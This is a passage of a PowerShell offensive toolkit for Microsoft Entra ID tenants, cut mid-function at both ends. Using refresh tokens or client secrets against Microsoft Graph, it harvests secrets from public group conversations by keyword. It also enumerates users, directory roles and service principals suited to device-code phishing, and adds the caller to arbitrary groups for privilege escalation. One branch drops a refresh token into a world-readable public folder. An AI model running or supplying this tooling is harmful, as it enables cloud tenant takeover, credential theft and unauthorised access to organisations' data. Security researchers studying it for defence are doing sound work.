        function Get-SensitiveConversations {
             param (
                [string]$GroupId,
                [string]$GroupName,
                [string]$AccessToken
            )

                if (-not (Test-Path "Conversations")) {
                    New-Item -ItemType Directory -Path "Conversations" | Out-Null
                }

                $headers = @{ Authorization = "Bearer $AccessToken" }
                $keywords = @("admin", "accesstoken", "refreshtoken", "token", "password", "secret")

                function Invoke-With-Retry {
                    param (
                        [string]$Url
                    )
                        $success = $false
                        $response = $null
                        do {
                            try {
                                $response = Invoke-RestMethod -Uri $Url -Headers $headers -ErrorAction Stop
                                $success = $true
                            } catch {
                                $statusCode = $_.Exception.Response.StatusCode.value__
                                if ($statusCode -eq 429) {
                                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                                    if (-not $retryAfter) { $retryAfter = 7 }
                                    Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                                    Start-Sleep -Seconds ([int]$retryAfter)
                                } else {
                                    Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                                    return $null
                                }
                            }
                        } while (-not $success)
                        return $response
                }

                $convos = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations"
                if (-not $convos) { return }

                foreach ($convo in $convos.value) {
                    $threads = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads"
                    if (-not $threads) { continue }

                        foreach ($thread in $threads.value) {
                            $posts = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/groups/$GroupId/conversations/$($convo.id)/threads/$($thread.id)/posts"
                            if (-not $posts) { continue }

                                foreach ($post in $posts.value) {
                                    $rawHtml = $post.body.content
                                    $rawName = "$GroupId-$($convo.id)-$($thread.id)"
                                    $cleanName = ($rawName -replace '[^\w\-]', '') 
                                    if ($cleanName.Length -gt 100) {
                                        $cleanName = $cleanName.Substring(0, 100)
                                    }
                                    $fileName = "$cleanName.html"
                                    $filePath = Join-Path -Path "Conversations" -ChildPath $fileName


                                    Add-Type -AssemblyName System.Web
                                    $decoded = [System.Web.HttpUtility]::HtmlDecode($rawHtml)
                                    $plainText = ($decoded -replace '<[^>]+>', '') -replace '\s{2,}', ' '

                                    foreach ($kw in $keywords) {
                                        if ($plainText -match "(?i)\b$kw\b.{0,200}") {
                                            $matchLine = $matches[0]
                                            Write-Host "[!!!] Suspicious content found in group '$GroupName': $kw" -ForegroundColor Red
                                            Write-Host "`t--> $matchLine" -ForegroundColor Gray

                                            Add-Content -Path "Public_Groups.txt" -Value "[DEAP] $GroupName ($GroupId) | keyword: $kw"
                                            Add-Content -Path "Public_Groups.txt" -Value "`t--> $matchLine"
                                            Add-Content -Path "Public_Groups.txt" -Value "`t--> Saved full HTML: Conversations\$fileName"
                                            break
                                        }
                                    }
                                }
                        }
                }
        }
	

		function Get-GroupsWithDirectoryRoles {
            param ($AccessToken)

                $headers = @{ Authorization = "Bearer $AccessToken" }
                $roles = Invoke-With-Retry -Url "https://graph.microsoft.com/v1.0/directoryRoles" -Headers $headers

                $GroupIdsWithRoles = @{}
                $ProcessedRoleIds = @{}

                foreach ($role in $roles.value) {
                    $roleId = $role.id
                    if ($ProcessedRoleIds.ContainsKey($roleId)) { continue }

                    $memberUrl = "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members"
                    $members = Invoke-With-Retry -Url $memberUrl -Headers $headers
                    Start-Sleep -Milliseconds 300

                    foreach ($member in $members.value) {
                        if ($member.'@odata.type' -eq "#microsoft.graph.group") {
                            $GroupIdsWithRoles[$member.id] = $role.displayName
                        }
                    }

                    $ProcessedRoleIds[$roleId] = $true
                }

            return $GroupIdsWithRoles
     }



        $headers = @{
            "Authorization"    = "Bearer $GraphAccessToken"
            "Content-Type"     = "application/json"
            "ConsistencyLevel" = "eventual"
            "Prefer"           = "odata.maxpagesize=999"
        }
        

        $startTime = Get-Date
        $refreshIntervalMinutes = 7
        $groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,visibility&$top=999"

        $totalGroupsScanned = 0

        Write-Host "`n[*] Fetching Public Groups..." -ForegroundColor DarkCyan

        $GroupIdToRoleMap = @{}
        $success1 = $false
            do {
                try {
                    Write-Host "[*] Fetching directory role assignments..." -ForegroundColor DarkCyan
                    $GroupIdToRoleMap = Get-GroupsWithDirectoryRoles -AccessToken $GraphAccessToken
                    $success1 = $true
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[!] Rate limit hit during role mapping. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } elseif ($statusCode -eq 401) {
                        Write-Host "[!] Token expired while retrieving roles, refreshing token..." -ForegroundColor Yellow
                        if ($authMethod -eq "refresh") {
                            $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                        } elseif ($authMethod -eq "client") {
                            $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                        }
                        if (-not $GraphAccessToken) { return }
                        $headers["Authorization"] = "Bearer $GraphAccessToken"
                    } else {
                        Write-Host "[-] Unhandled error during role mapping. Exiting." -ForegroundColor Red
                        return
                    }
                }
            } while (-not $success1)

	
            do {
                $success = $false
                do {
                    try {
                        $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                        $success = $true
                    } catch {
                        $statusCode = $_.Exception.Response.StatusCode.value__
                        if ($statusCode -eq 429) {
                            $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                            if (-not $retryAfter) { $retryAfter = 7 }
                            Write-Host "[!] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                            Start-Sleep -Seconds ([int]$retryAfter)
                        } elseif ($statusCode -eq 401) {
                            Write-Host "[!] Access token expired, refreshing..." -ForegroundColor DarkYellow
                            if ($authMethod -eq "refresh") {
                                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                            } elseif ($authMethod -eq "client") {
                                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                            }
                            if (-not $GraphAccessToken) { return }
                                $headers["Authorization"] = "Bearer $GraphAccessToken"
                                $startTime = Get-Date
                        } else {
                            Write-Host "[-] Unexpected error. Exiting." -ForegroundColor Red
                            return
                         }
                    }
                } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0


        foreach ($group in $groupsBatch) {
            $groupId = $group.id
            $groupName = $group.displayName
            $visibility = $group.visibility
			
			if ($visibility -eq "Public") {
                if ($GroupIdToRoleMap.ContainsKey($groupId)) {
                    Write-Host "[!!!] $groupName ($groupId) is Public AND has Directory Role: $($GroupIdToRoleMap[$groupId])" -ForegroundColor Yellow
                    "[Privileged] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : Role = $($GroupIdToRoleMap[$groupId])" | Add-Content -Path "Public_Groups.txt"
                } else {
                    Write-Host "[+] $groupName ($groupId) is Public" -ForegroundColor DarkGreen
                    "$($groupName.PadRight(30)) : $($groupId.PadRight(40))" | Add-Content -Path "Public_Groups.txt"
                }
				if ($Deep) {
					Get-SensitiveConversations -GroupId $groupId -GroupName $groupName -AccessToken $GraphAccessToken
				}
            }

            $scannedInBatch++
            $totalGroupsScanned++
            $percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
            Write-Progress -Activity "Scanning Public Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
        }


        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[*] Refresh interval reached, refreshing token..." -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }
		
        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`n[*] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
}


<###############################################################################################################################################>


function Invoke-FindServicePrincipal {
    param (
        [Parameter(Mandatory = $true)] [string]$RefreshToken,
	    [Parameter(Mandatory = $true)] [string]$TenantID
    )


        function Get-GraphAccessToken {

            $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token" 
            $body = @{
                client_id     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                scope         = "https://graph.microsoft.com/.default"
                grant_type    = "refresh_token"
                refresh_token = $RefreshToken
            }

            try {
                $response = Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
                return $response.access_token
            } catch {
                Write-Host "[-] Failed to get access token: $_" -ForegroundColor Red
                exit 1
            }
        }

        
        $Global:GraphAccessToken = Get-GraphAccessToken -RefreshToken $RefreshToken
        $StartTime = Get-Date

        $headers = @{
            "Authorization" = "Bearer $GraphAccessToken"
            "Content-Type"  = "application/json"
        }

        $allServicePrincipalIds = @()
        $uri = "https://graph.microsoft.com/v1.0/servicePrincipals"
        Write-Host "[*] Fetching all Service Principal IDs..." -ForegroundColor Cyan

        do {
            try {
                $response = Invoke-RestMethod -Method GET -Uri $uri -Headers $headers -ErrorAction Stop
                $allServicePrincipalIds += $response.value | ForEach-Object { $_.id }
                $uri = $response.'@odata.nextLink'
            } catch {
					if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 10 }
                        Write-Host "[-] 429 received. Waiting $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds $retryAfter
					}
					else{
						Write-Host "[-] Failed to Service Principals" -ForegroundColor Red
						break
					}
			    }
        } while ($uri)

        Write-Host "[+] Retrieved $($allServicePrincipalIds.Count) Service Principal IDs." -ForegroundColor Green
        $output = @()

        foreach ($id in $allServicePrincipalIds) {

                if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                    Write-Host "[*] Refreshing Access Token..." -ForegroundColor Yellow
                    $Global:GraphAccessToken = Get-GraphAccessToken -RefreshToken $RefreshToken
                    $StartTime = Get-Date
                    $headers = @{
                        "Authorization" = "Bearer $GraphAccessToken"
                        "Content-Type"  = "application/json"
                    }
                }

                $spUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$id"
                $grantsUri = "https://graph.microsoft.com/v1.0/servicePrincipals/$id/oauth2PermissionGrants"

                $response = $null
                $grants = $null


            while ($true) {
                try {
                    $response = Invoke-RestMethod -Uri $spUri -Headers $headers -Method GET -ErrorAction Stop
                    $grants = Invoke-RestMethod -Uri $grantsUri -Headers $headers -Method GET -ErrorAction SilentlyContinue
                    break
                } catch {
                    if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 10 }
                        Write-Host "[-] 429 received. Waiting $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds $retryAfter
                    } else {
                        Write-Host "[-] Failed to fetch SP $id" -ForegroundColor Red
                        break
                    }
                }
            }


            if ($response) {
                $clientId = $response.appId
                $displayName = $response.displayName
                $scopes = $response.oauth2PermissionScopes
                $ReplyUrls = $response.replyUrls
                $delegatedScopes = $scopes | Where-Object { $_.type -eq "User" }

                $hasNoSecret = -not $response.passwordCredentials -or $response.passwordCredentials.Count -eq 0
                $hasDelegatedScopes = $delegatedScopes.Count -gt 0
                $hasAdminConsent = $false
                if ($grants.value | Where-Object { $_.consentType -eq "AllPrincipals" }) {
                    $hasAdminConsent = $true
                }

                if ($hasDelegatedScopes -and $hasNoSecret -and -not $hasAdminConsent) {
                    foreach ($scope in $delegatedScopes) {
                        $line1 = "[+] $displayName | client_id: $clientId | scope: $($scope.value) | consent: $($scope.adminConsentDescription)"
                        Write-Host $line1 -ForegroundColor Green
                        Write-Host "[Reply URLs]:" -ForegroundColor DarkCyan
                        foreach ($url in $response.replyUrls) {
                            Write-Host "  - $url" -ForegroundColor DarkGreen
                        }
                        Write-Host "================="

                        $output += $line1
                        $output += $response.replyUrls | ForEach-Object { "  - $_" }
                        $output += "================="
                    }
                } else {
                    $line = "[-] $displayName | client_id: $clientId | Skipped (admin consent granted or not eligible)"
                    Write-Host $line -ForegroundColor DarkGray
                }
            }
        }

    $output | Out-File -FilePath "ServicePrincipals_DeviceFlow_Eligible.txt" -Encoding UTF8
    Write-Host "`n✅ Exported to ServicePrincipals_DeviceFlow_Eligible.txt" -ForegroundColor Green
}



<###############################################################################################################################################>


function Invoke-FindUserRole {
<#

Enumerate all UPN in Tenant, and what directory role have to each one

Invoke-FindUserRole -RefreshToken <Refresh Token> -DomainName <domain.local>



#>

    param(
        [Parameter(Mandatory = $true)] [string]$RefreshToken,
        [Parameter(Mandatory = $true)] [string]$DomainName

    )

    	function Get-DomainName {
            try {
                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
                $TenantID = ($response.issuer -split "/")[3]
                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
                 return $TenantID
            } catch {
                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
                return $null
             }
        }

        function Get-Token-WithRefreshToken {
                param(
                    [Parameter(Mandatory = $false)] [string]$RefreshToken,
                    [Parameter(Mandatory = $false)] [string]$TenantID
                )

                    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                    $body = @{
                        "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope"         = "https://graph.microsoft.com/.default"
                        "grant_type"    = "refresh_token"
                        "refresh_token" = $RefreshToken
                    }
                    return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
            }

       	if ($DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }

        if($RefreshToken) {
            $AccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
        }


        $headers = @{
            Authorization = "Bearer $AccessToken"
            "Content-Type" = "application/json"
        }

        $allUsers = @()
        $uri = "https://graph.microsoft.com/v1.0/users"

        Write-Host "[*] Fetching users..." -ForegroundColor Cyan

        # Fetch all users with paging
        while ($uri) {
            try {
                $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
                $allUsers += $response.value
                $uri = $response.'@odata.nextLink'
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 10 }
                        Write-Host "[!] 429 Too Many Requests. Retrying in $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds $retryAfter
                }
            
            }
        }

		Write-Host "[*] Total users fetched: $($allUsers.Count)" -ForegroundColor Cyan

		$usersWithRoles = @()

        foreach ($user in $allUsers) {
            $id = $user.id
            $upn = $user.userPrincipalName

            Write-Host "`n[*] Checking roles for: $upn ($id)" -ForegroundColor Cyan

            $roleUri = "https://graph.microsoft.com/v1.0/users/$id/transitiveMemberOf/microsoft.graph.directoryRole"

            while ($true) {
                try {
                    $roleResponse = Invoke-RestMethod -Uri $roleUri -Headers $headers -Method Get
                    $roles = $roleResponse.value

                    if ($roles.Count -eq 0) {
                        break
                    }

                    Write-Host "[+] $upn ($id) has the following roles:" -ForegroundColor Green
                    $roleNames = @()
                    foreach ($role in $roles) {
                        $roleNames += $role.displayName
                        Write-Host "    -> $($role.displayName)" -ForegroundColor Yellow
                    }

                    # Add to summary list
                    $usersWithRoles += [PSCustomObject]@{
                        UPN       = $upn
                        ObjectId  = $id
                        Roles     = ($roleNames -join ", ")
                    }
                    break
                } catch {
                    if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 10 }
                        Write-Host "[!] 429 Too Many Requests. Retrying in $retryAfter seconds..." -ForegroundColor DarkYellow
                        Start-Sleep -Seconds $retryAfter
                    } else {
                        Write-Host "[-] Failed to fetch roles for $upn ($id): $_" -ForegroundColor Red
                        break
                    }
                }
            }
        }

    # === Summary Output ===
        if ($usersWithRoles.Count -gt 0) {
            Write-Host "`n==========================" -ForegroundColor Cyan
            Write-Host "Users with Roles Found:" -ForegroundColor Cyan
            Write-Host "==========================" -ForegroundColor Cyan
            foreach ($user in $usersWithRoles) {
                Write-Host "`nUPN: $($user.UPN)" -ForegroundColor Green
                Write-Host "ObjectId: $($user.ObjectId)" -ForegroundColor DarkCyan
                Write-Host "Roles: $($user.Roles)" -ForegroundColor Yellow
            }
        } else {
            Write-Host "`n[!] No users with roles found." -ForegroundColor DarkGray
        }
}




<######################################################################################################################################################>


function Invoke-FindUserByWord {

<#

Find a user account by searching spesicip word

Invoke-FindUserByWord -RefreshToken <Refresh Token> -DomainName <domain.local> -Word admin

#>

    param(
        [Parameter(Mandatory = $true)] [string]$RefreshToken,
		[Parameter(Mandatory = $true)] [string]$DomainName,
		[Parameter(Mandatory = $true)] [string]$Word
    )

	    $OutputFile = "FoundUsers.txt"
	    if (Test-Path $OutputFile) { Remove-Item $OutputFile -Force }


    	function Get-DomainName {
            try {
                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
                $TenantID = ($response.issuer -split "/")[3]
                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
                 return $TenantID
            } catch {
                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
                return $null
             }
        }


        function Get-Token-WithRefreshToken {
                param(
                    [Parameter(Mandatory = $false)] [string]$RefreshToken,
                    [Parameter(Mandatory = $false)] [string]$TenantID
                )

                    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                    $body = @{
                        "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                        "scope"         = "https://graph.microsoft.com/.default"
                        "grant_type"    = "refresh_token"
                        "refresh_token" = $RefreshToken
                    }
                    return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
            }

       	if ($DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }

        if($RefreshToken) {
            $AccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
        }
    

        $TokenStartTime = Get-Date
        $UsersUrl = "https://graph.microsoft.com/v1.0/users"
        $BeesUsers = @()

        while ($UsersUrl) {
        
            if ((New-TimeSpan -Start $TokenStartTime).TotalMinutes -ge 7) {
                Write-Host "[*] Refreshing Access Token..." -ForegroundColor Cyan
                $AccessToken = Get-AccessTokenFromRefresh
                if (-not $AccessToken) { break }
                $TokenStartTime = Get-Date
            }

            $Headers = @{
                "Authorization" = "Bearer $AccessToken"
                "Content-Type"  = "application/json"
            }

            try {
                $Response = Invoke-RestMethod -Method Get -Uri $UsersUrl -Headers $Headers -ErrorAction Stop

                foreach ($User in $Response.value) {
                    if (
                        ($User.displayName -like "*$Word*" -or
                        $User.mail -like "*$Word*" -or
                        $User.userPrincipalName -like "*$Word*" -or
                        $User.givenName -like "*$Word*" -or
                        $User.surname -like "*$Word*")
                    ) {
					    $BeesUsers += $User
                        $Line = "$($User.displayName) | $($User.userPrincipalName)"
                        Add-Content -Path $OutputFile -Value $Line
                        Write-Host ""
                        Write-Host "[+] Found: " -NoNewline
                        Write-Host "$($User.displayName)" -ForegroundColor Green -NoNewline
                        Write-Host " | $($User.userPrincipalName)" -ForegroundColor DarkGray
                    }
                }

                $UsersUrl = $Response.'@odata.nextLink'
            } catch {
                    if ($_.Exception.Response.StatusCode.value__ -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if ($retryAfter) {
                            Write-Host "[!] Rate limit hit. Retrying after $retryAfter seconds..." -ForegroundColor Yellow
                            Start-Sleep -Seconds ([int]$retryAfter)
                        } else {
                            Write-Host "[!] Rate limit hit. Retrying after default 60 seconds..." -ForegroundColor Yellow
                            Start-Sleep -Seconds 60
                        }
                    } else {
                        Write-Warning "Failed to retrieve users: $_"
                        break
                    }
                }
        }

    return $BeesUsers
}


<######################################################################################################################################################>

function Invoke-GroupMappingFromJWT {

<#
if your Access Token contain a list of groups
this script will help you to enumerate this groups for undestanding if youi have high privilege.

Invoke-GroupMappingFromJWT -jwt <eyJ0eXAiOiJKV1QiLCJhbG...> -GraphAccessToken <eyJ0eXAiOiJKV1QiLCJub25j...>

#>

    param (
        [Parameter(Mandatory = $true)][string]$jwt,
        [Parameter(Mandatory = $true)][string]$GraphAccessToken
    )

        function Decode-JWT {
            param ([string]$Token)
            $tokenParts = $Token.Split('.')
            if ($tokenParts.Length -lt 2) {
                throw "Invalid JWT format"
            }

            $payload = $tokenParts[1].Replace('-', '+').Replace('_', '/')
            switch ($payload.Length % 4) {
                2 { $payload += "==" }
                3 { $payload += "=" }
                1 { $payload += "===" }
            }

            $bytes = [System.Convert]::FromBase64String($payload)
            $json = [System.Text.Encoding]::UTF8.GetString($bytes)
            return $json | ConvertFrom-Json
        }   

        Write-Host "`n[*] Decoding JWT..." -ForegroundColor Cyan
        $DecodedToken = Decode-JWT -Token $jwt

        if (-not $DecodedToken.groups) {
            Write-Host "[-] No 'groups' claim found in the token." -ForegroundColor Red
            return
        }

        $GroupIds = $DecodedToken.groups
        Write-Host "[*] Found $($GroupIds.Count) groups in token. Resolving via Graph..." -ForegroundColor Cyan

        foreach ($gid in $GroupIds) {
            $groupUrl = "https://graph.microsoft.com/v1.0/groups/$gid"
            $roleUrl = "https://graph.microsoft.com/v1.0/directoryRoles"
            $headers = @{ Authorization = "Bearer $GraphAccessToken" }
            $RetryCount = 0
            $MaxRetries = 5

            while ($RetryCount -lt $MaxRetries) {
                try {
                    $group = Invoke-RestMethod -Uri $groupUrl -Headers $headers -Method GET -ErrorAction Stop
                    Write-Host "`n[+] $($group.displayName) ($gid)" -ForegroundColor Green
                    if ($group.groupTypes -contains "Unified") {
						Write-Host "    [Type] Microsoft 365 Group (Unified)" -ForegroundColor DarkCyan
					} elseif ($group.securityEnabled -eq $true) {
						Write-Host "    [Type] Security Group" -ForegroundColor DarkCyan
					} else {
						Write-Host "    [Type] Unknown / Other" -ForegroundColor DarkCyan
					}

               
                    $appRoleUrl = "https://graph.microsoft.com/v1.0/groups/$gid/appRoleAssignments"
                    $appRoles = Invoke-RestMethod -Uri $appRoleUrl -Headers $headers -Method GET -ErrorAction Stop
                    if ($appRoles.value.Count -eq 0) {
                        Write-Host "    [AppRoleAssignment] None" -ForegroundColor DarkGray
                    } else {
                        foreach ($app in $appRoles.value) {
                            Write-Host "    [AppRoleAssignment] ResourceId: $($app.resourceId) - RoleId: $($app.appRoleId)" -ForegroundColor Magenta
                        }
                    }

                
                    $roles = Invoke-RestMethod -Uri $roleUrl -Headers $headers -Method GET -ErrorAction Stop
                    $matchingRole = $roles.value | Where-Object { $_.members -contains "https://graph.microsoft.com/v1.0/groups/$gid" }

                    if ($matchingRole) {
                        Write-Host "    [Directory Role] $($matchingRole.displayName)" -ForegroundColor Yellow
                    } else {
                        Write-Host "    [Directory Role] None" -ForegroundColor DarkGray
                    }
                    break
                } catch {
                    $response = $_.Exception.Response
                    if ($response -and $response.StatusCode.value__ -eq 429) {
                        $retryAfter = 20
                        Write-Host "[!] Rate limited (429) - retrying in $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds $retryAfter
                        $RetryCount++
                    } else {
                        Write-Host "[-] Could not resolve group: $gid" -ForegroundColor DarkGray
                        break
                    }
                }
            }
        Start-Sleep -Milliseconds 300
        }
}

<######################################################################################################################################################>

function Invoke-MembershipChange {

<#

For adding yourself or others to group or list of groups
#>
    param(
        [Parameter(Mandatory = $false)][string]$RefreshToken,
		[Parameter(Mandatory = $false)][string]$ClientID,
		[Parameter(Mandatory = $false)][string]$ClientSecret,
		[Parameter(Mandatory = $false)][string]$UserID,
		[Parameter(Mandatory = $true)][string]$DomainName,
        [Parameter(Mandatory = $true)][ValidateSet("add", "delete")][string]$Action,
        [Parameter(Mandatory = $true)][string]$GroupIdsInput,
        [string]$SuccessLogFile = ".\\success_log.txt",
		[string]$SuccessRenoveLogFile = ".\\success_Remove_log.txt"
		
    )



    	function Get-DomainName {
            try {
                $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
                $TenantID = ($response.issuer -split "/")[3]
                Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
                 return $TenantID
            } catch {
                Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
                return $null
             }
        }


       	if ($DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }


		function Get-Token-WithRefreshToken {
		param(
        [Parameter(Mandatory = $false)][string]$RefreshToken,
        [Parameter(Mandatory = $false)][string]$TenantID
		)
		
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "refresh_token"
				"refresh_token" = $RefreshToken
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}


		function Get-Token-WithClientSecret {
		param(
			[Parameter(Mandatory = $false)][string]$ClientID,
		    [Parameter(Mandatory = $false)][string]$ClientSecret,
            [Parameter(Mandatory = $false)][string]$TenantID

		)
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

		$authMethod = ""
		if ($RefreshToken) {
			$authMethod = "refresh"
			$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
		} elseif ($ClientId -and $ClientSecret) {
			$authMethod = "client"
			$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret -TenantID $TenantID
		} elseif ($DeviceCodeFlow) {
			$authMethod = "refresh"
			if (Test-Path "C:\Users\Public\RefreshToken.txt"){
				Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
				$RefreshToken = Get-DeviceCodeToken
				Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
				Write-Host "[FOR YOU BABY] refresh token writen in C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken -TenantID $TenantID
			}
		if (-not $GraphAccessToken) { return }

	
	    function Decode-JWT {
            param([Parameter(Mandatory = $true)][string]$Token)
            $tokenParts = $Token.Split(".")
            $payload = $tokenParts[1].Replace('-', '+').Replace('_', '/')
            switch ($payload.Length % 4) { 2 { $payload += "==" }; 3 { $payload += "=" } }
            $bytes = [System.Convert]::FromBase64String($payload)
            return ([System.Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
	    }
	
	
		if($UserID){
			$MemberId = $UserID
		}
		else {
			$DecodedToken = Decode-JWT -Token $GraphAccessToken
			$MemberId = $DecodedToken.oid
		}
	
        Write-Host "[*] MemberId extracted: $MemberId" -ForegroundColor Cyan

        $GroupIds = if (Test-Path $GroupIdsInput) {
            Get-Content -Path $GroupIdsInput | Where-Object { $_.Trim() -ne "" }
        } else {
            @($GroupIdsInput)
        }

        if ($Action -eq "add" -and (Test-Path $SuccessLogFile)) { Remove-Item $SuccessLogFile -Force }

        $StartTime = Get-Date

        foreach ($GroupId in $GroupIds) {

            if ((Get-Date) -gt $StartTime.AddMinutes(7)) {
                Write-Host "[*] Refreshing Access Token..." -ForegroundColor Yellow
                $Global:GraphAccessToken = Get-GraphAccessToken -RefreshToken $RefreshToken
                $StartTime = Get-Date
            }
            $Headers = @{
                'Authorization' = "Bearer $GraphAccessToken"
                'Content-Type'  = 'application/json'
            }
            $RetryCount = 0
            $MaxRetries = 5
            $Success = $false

            do {
                try {
                    if ($Action -eq "add") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/`$ref"
                        $Body = @{ '@odata.id' = "https://graph.microsoft.com/v1.0/directoryObjects/$MemberId" } | ConvertTo-Json
                        Invoke-RestMethod -Method POST -Uri $Url -Headers $Headers -Body $Body -ContentType "application/json"
                        Write-Host "[+] Added $MemberId to $GroupId" -ForegroundColor Green
                        
                        Add-Content -Path $SuccessLogFile -Value $GroupId
                        $Success = $true
                    } elseif ($Action -eq "delete") {
                        $Url = "https://graph.microsoft.com/v1.0/groups/$GroupId/members/$MemberId/`$ref"
                        Invoke-RestMethod -Method DELETE -Uri $Url -Headers $Headers
                        Write-Host "[+] Removed $MemberId from $GroupId" -ForegroundColor Green
                        Add-Content -Path $SuccessRenoveLogFile -Value $GroupId
                        $Success = $true
                    }
                } catch {
                    $Response = $_.Exception.Response
                    $StatusCode = 0
                    $ErrorMessage = "Unknown Error"

                    if ($Response) {
                        $StatusCode = $Response.StatusCode.value__
